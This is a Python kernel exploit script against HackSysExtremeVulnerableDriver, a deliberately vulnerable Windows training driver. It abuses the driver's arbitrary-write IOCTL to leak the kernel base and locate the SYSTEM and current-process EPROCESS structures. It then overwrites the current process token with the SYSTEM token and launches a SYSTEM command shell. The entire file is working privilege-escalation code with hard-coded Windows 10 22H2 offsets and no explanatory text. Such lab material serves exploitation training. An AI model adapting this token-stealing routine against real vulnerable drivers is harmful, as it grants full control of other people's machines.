from ctypes import *
from ctypes import wintypes as w
from struct import pack
from os import system, getpid

INVALID_HANDLE_VALUE  = 0xFFFFFFFFFFFFFFFF

GENERIC_READ          = 0x80000000
GENERIC_WRITE         = 0x40000000
FILE_FLAG_OVERLAPPED  = 0x40000000
FILE_ATTRIBUTE_NORMAL = 0x80
FILE_SHARE_READ       = 0x00000001
FILE_SHARE_WRITE      = 0x00000002
OPEN_EXISTING         = 0x3

MEM_COMMIT  = 0x00001000
MEM_RESERVE = 0x00002000

PAGE_READWRITE = 0x04

IOCTL       = 0x22200B # ARBITRARY_WRITE

PsInitialSystemProcess_Offset = 0xCFC420

ActiveProcessLinks_Offset = 0x448
UniqueProcessId_Offset = 0x440
Token_Offset = 0x4b8

dwBytesReturned = w.DWORD(0)

Driver = b"\\\\.\\HackSysExtremeVulnerableDriver"

DeviceIOControl          = windll.Kernel32.DeviceIoControl
CreateFileA              = windll.Kernel32.CreateFileA
VirtualAlloc             = windll.Kernel32.VirtualAlloc
EnumDeviceDrivers        = windll.Psapi.EnumDeviceDrivers
GetDeviceDriverBaseNameA = windll.Psapi.GetDeviceDriverBaseNameA

DeviceIOControl.argtypes = w.HANDLE, w.DWORD, c_void_p, w.DWORD, c_void_p, w.DWORD, POINTER(w.DWORD), c_void_p
DeviceIOControl.restype = w.BOOL

CreateFileA.argtypes = w.LPCSTR, w.DWORD, w.DWORD, c_void_p, w.DWORD, w.DWORD, w.HANDLE
CreateFileA.restype = w.HANDLE

VirtualAlloc.argtypes = c_void_p, c_size_t, w.DWORD, w.DWORD
VirtualAlloc.restype = c_void_p

EnumDeviceDrivers.argtypes = w.LPVOID, w.DWORD, POINTER(w.DWORD)
EnumDeviceDrivers.restype = w.BOOL

GetDeviceDriverBaseNameA.argtypes = w.LPVOID, w.LPSTR, w.DWORD
GetDeviceDriverBaseNameA.restype = w.DWORD

def DereferenceAddress(address):
    Dereferenced_Bytes = 0x0
    Byte_Array = (c_ubyte * 8).from_address(address)
    for i in range(8):
        Dereferenced_Bytes |= (Byte_Array[i] << (i * 8))
    return Dereferenced_Bytes

def ArbitraryWrite(what, where):
    write_what_where = b""
    write_what_where += pack("<Q", what)
    write_what_where += pack("<Q", where)
        
    if(DeviceIOControl(hDriver, w.DWORD(IOCTL), write_what_where, len(write_what_where), None, 0, byref(dwBytesReturned), None) == 0):
        print("[!] DeviceIOControl call failed.")
    return

def GetKernelBase():
    i = 0
    DriverName = create_string_buffer(0x100)
    DriverList = VirtualAlloc(None, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)

    EnumDeviceDrivers(DriverList, 4096, None)

    while i < (4096 / 8):
        DriverAddress = DereferenceAddress(DriverList)
        GetDeviceDriverBaseNameA(DriverAddress, DriverName, 0x100)
        if DriverName.value.decode("UTF-8") == "ntoskrnl.exe":
            return DriverAddress
        i += 1
        DriverList += 8
    return None

def GetEPROCESS(eprocess):
    EPROCESS_Buffer = VirtualAlloc(None, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)
    if not EPROCESS_Buffer:
        print("[!] Failed to allocate memory to search for current EPROCESS")
        exit(-1)

    Current_PID = VirtualAlloc(None, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)
    if not Current_PID:
        print("[!] Failed to allocate memory to search for current PID")
        exit(-1)

    ArbitraryWrite(ntoskrnl + PsInitialSystemProcess_Offset, EPROCESS_Buffer)
    Current_EPROCESS = DereferenceAddress(EPROCESS_Buffer) # SYSTEM EPROCESS
    
    if eprocess == "system":
        return Current_EPROCESS

    if eprocess == "current":
        while(True):
            ArbitraryWrite(Current_EPROCESS + ActiveProcessLinks_Offset, EPROCESS_Buffer)
            Current_EPROCESS = DereferenceAddress(EPROCESS_Buffer) - ActiveProcessLinks_Offset

            ArbitraryWrite(Current_EPROCESS + UniqueProcessId_Offset, Current_PID)

            if DereferenceAddress(Current_PID) == getpid():
                return Current_EPROCESS


print("\nHEVD 3.00 ARBITRARY_WRITE x64 Windows 10 22H2 - Slimicide\n")

hDriver = CreateFileA(Driver, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, None)

if(hDriver == INVALID_HANDLE_VALUE):
    print(f"[!] Failed to open a handle to {Driver.decode()}")
    exit(-1)

print("[+] Targeting ARBITRARY_WRITE (IOCTL: 0x22200B)")
print(f"[+] Handle opened to {Driver.decode()} at {hDriver}")

ntoskrnl = GetKernelBase()
if not ntoskrnl:
    print("[!] Failed to leak the kernel base")
    exit(-1)

print(f"[+] Leaked NtOsKrnl Base: {hex(ntoskrnl)}")

System_EPROCESS = GetEPROCESS("system")
print(f"[+] System EPROCESS structure located at {hex(System_EPROCESS)}")
System_Token = System_EPROCESS + Token_Offset
print(f"[+] NT Authority\SYSTEM access token located at {hex(System_Token)}")

Current_EPROCESS = GetEPROCESS("current")
print(f"[+] Current EPROCESS structure located at {hex(Current_EPROCESS)} (PID: {getpid()})")

print("[+] Overwriting current token with NT Authority\SYSTEM token")
ArbitraryWrite(System_Token, Current_EPROCESS + Token_Offset)

print("[+] Successfully copied token, prepare for SYSTEM shell\n")
system("cmd.exe")